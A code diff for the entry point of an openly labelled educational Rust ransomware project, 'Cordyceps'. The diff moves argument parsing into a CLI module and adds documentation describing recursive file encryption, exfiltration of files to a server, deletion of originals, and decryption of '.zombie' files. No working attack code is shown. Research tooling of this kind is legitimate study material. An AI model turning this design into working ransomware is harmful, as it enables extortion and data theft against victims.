@@ -1,63 +1,29 @@
-use clap::{Parser, ValueEnum};
-use log::info;
-use std::path::PathBuf;
+//! # Cordyceps
+//!
+//! **Cordyceps** is an educational, Rust-based command-line ransomware designed for academic and research purposes. It demonstrates the core mechanisms of file encryption, exfiltration, and decryption using modern cryptographic practices.
+//!
+//! It provides robust capabilities to:
+//! - Recursively encrypt files using **AES-GCM 256-bit** and **ECIES (ED25519)**, then securely transmit them to a server.
+//! - Decrypt previously encrypted `.zombie` files back to their original state.
+//!
+//! ## Usage
+//! To run Cordyceps, navigate to the project root and use `cargo run`.
+//! For a full list of command-line options and detailed usage examples, refer to the project's [README.md](https://github.com/lopes/cordyceps).
+//!
+//! ```sh
+//! cargo run -- --help
+//! ```
+//!
+//! ## Contributing & License
+//! Contributions are welcome! Please see the [CONTRIBUTING.md](https://github.com/lopes/cordyceps) file for guidelines.
+//!
+//! This project is licensed under the **MIT License**.
+//!
+//! ---
 
-#[derive(ValueEnum, Debug, Clone)]
-enum Mode {
-    Encrypt,
-    Decrypt,
-}
-
-/// Command-line arguments
-#[derive(Parser, Debug)]
-#[command(
-    author = "Joe Lopes <lopes.id>",
-    version = "0.1.0",
-    about = "Rust ransomware, for learning not looting",
-    long_about = "Cordyceps is an educational ransomware designed for academic and research purposes."
-)]
-struct Args {
-    /// Mode: encrypt or decrypt
-    #[arg(short = 'm', long, default_value = "encrypt")]
-    mode: Mode,
-
-    /// Root directory
-    #[arg(short = 'p', long, default_value = ".")]
-    path: PathBuf,
-
-    /// Do not delete original files after encryption--encryption mode only
-    #[arg(short = 'n', long)]
-    no_delete: bool,
-
-    /// Server address for exfiltration--encryption mode only
-    #[arg(short = 's', long, default_value = "http://localhost:8080")]
-    server: String,
-
-    /// Target folder on the server for exfiltration--encryption mode only
-    #[arg(short = 't', long)]
-    target_folder: Option<String>,
-
-    /// Path to the server private key--decryption mode only
-    #[arg(short = 'k', long, default_value = "server_ed25519_private.key")]
-    key: PathBuf,
-}
+mod cli;
 
 fn main() {
     env_logger::init();
-    let args = Args::parse();
-
-    match args.mode {
-        Mode::Encrypt => info!(
-            "call ENCRYPTION module: path:{}, keep?{}, server:{}, folder:{}",
-            args.path.display(),
-            args.no_delete,
-            args.server,
-            args.target_folder.unwrap_or("/".to_string()),
-        ),
-        Mode::Decrypt => info!(
-            "call DECRYPTION module: path:{}, key:{}",
-            args.path.display(),
-            args.key.display(),
-        ),
-    }
+    cli::run();
 }
